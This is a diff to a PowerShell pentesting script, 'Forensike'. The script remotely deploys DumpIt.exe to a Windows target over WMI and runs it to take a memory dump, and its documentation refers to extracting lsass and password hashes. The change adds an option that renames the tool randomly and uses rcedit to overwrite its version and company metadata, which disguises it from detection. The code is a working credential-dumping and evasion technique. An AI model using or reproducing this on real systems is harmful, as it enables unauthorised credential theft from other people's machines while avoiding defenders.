@@ -1,4 +1,4 @@
-﻿<#  
+<#  
 .SYNOPSIS  
     Forensike for pentesting
 
@@ -15,6 +15,8 @@
 .PARAMETER DumpDir
 	This is the path you want the final results text file to be written. This folder will also contain both lsass.txt and hashes.txt
 
+.PARAMETER Metadata
+    If specified, the script will copy Dumpit.exe with a random name and use rcedit-x64.exe to remove metadata from the copy.
 
 .NOTEs:  
     	
@@ -32,7 +34,10 @@ Param(
    [string]$toolsDir,
    
    [Parameter(Mandatory=$True)]
-   [string]$dumpDir
+   [string]$dumpDir,
+
+   [Parameter(Mandatory=$False)]
+   [switch]$Metadata
      
     )
    
@@ -87,8 +92,9 @@ Write-Host -ForegroundColor White "==[ Current logged on user: $currUser"
 echo "====================================================================="
 echo ""
 
-## Check prerequisite
+## Check prerequisites
 # Check if WINDBG is installed before running
+
 Function Test-WinDBG
 {
     $oldPreference = $ErrorActionPreference
@@ -116,6 +122,7 @@ $physicalMemory = Get-WmiObject Win32_ComputerSystem -ComputerName $target | Sel
 # Convert bytes to gigabytes for a more readable result
 $estimatedDumpSizeGB = [math]::Round($physicalMemory / 1GB, 3)
 
+echo ""
 Write-Host "Estimated final Windows Crash Dump size is " -nonewline
 Write-Host -ForegroundColor Green "$estimatedDumpSizeGB " -nonewline
 Write-Host "GB"
@@ -140,6 +147,7 @@ if ($confirmation -ne 'Y' -and $confirmation -ne 'y') {
     Write-Host "Operation cancelled by user."
     Exit
 }
+
 ################
 ##Set up environment on remote system. Forensike folder for memtools and art folder for memory.##
 ################
@@ -154,18 +162,46 @@ if ($confirmation -ne 'Y' -and $confirmation -ne 'y') {
 		New-Item -Path $remoteMEMfold -ItemType Directory | Out-Null
 		$ForensikeFolder = "C:\windows\Temp\Forensike"
 		$date = Get-Date -format yyyy-MM-dd_HHmm_
-		
+
 	##connect and move softwares to target client
 		echo ""
 		Write-Host -Fore White "Copying tools...."
-		Copy-Item $toolsDir\DumpIt.exe $remoteMEMfold -recurse
+
+		# Check if Metadata parameter is used
+		if ($Metadata) {
+			# Generate a random name for DumpIt.exe
+			$randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
+			$randomDumpItPath = "$toolsDir\$randomName.exe"
+			
+			# Copy DumpIt.exe to the new random name
+			Copy-Item "$toolsDir\DumpIt.exe" $randomDumpItPath
+
+			# Use rcedit-x64.exe to remove metadata
+			& "$toolsDir\rcedit-x64.exe" $randomDumpItPath --set-file-version "11.22.33"
+			& "$toolsDir\rcedit-x64.exe" $randomDumpItPath --set-product-version "11.22.33"
+			& "$toolsDir\rcedit-x64.exe" $randomDumpItPath --set-version-string "OriginalFilename" $randomName
+			& "$toolsDir\rcedit-x64.exe" $randomDumpItPath --set-version-string "CompanyName" $randomName
+			& "$toolsDir\rcedit-x64.exe" $randomDumpItPath --set-version-string "ProductName" $randomName
+			& "$toolsDir\rcedit-x64.exe" $randomDumpItPath --set-version-string "FileDescription" $randomName
+			& "$toolsDir\rcedit-x64.exe" $randomDumpItPath --set-version-string "LegalCopyright" $randomName
+
+			# Copy the modified DumpIt.exe to the remote folder
+			Copy-Item $randomDumpItPath $remoteMEMfold -recurse
+		} else {
+			# Copy the original DumpIt.exe to the remote folder
+			Copy-Item "$toolsDir\DumpIt.exe" $remoteMEMfold -recurse
+		}
+
 		Write-Host -ForegroundColor Green "  [done]"
 		
-
 	#Run DumpIt remotely
 		$memName = "Forensike"
 		$dumpPath = $ForensikeFolder+"\"+$memName+".dmp"
-		$memdump = "powershell /c $ForensikeFolder\DumpIt.exe /OUTPUT $dumpPath /QUIET" 
+		if ($Metadata) {
+			$memdump = "powershell /c $ForensikeFolder\$randomName.exe /OUTPUT $dumpPath /QUIET"
+		} else {
+			$memdump = "powershell /c $ForensikeFolder\DumpIt.exe /OUTPUT $dumpPath /QUIET"
+		}
 		Invoke-WmiMethod -class Win32_process -name Create -ArgumentList $memdump -ComputerName $target | Out-Null
 		echo "====================================================================="
 		Write-Host -ForegroundColor White -BackgroundColor Darkred ">>>>>>>>>>[ STARTING CRASH DUMP ACQUISITION ]<<<<<<<<<<<"
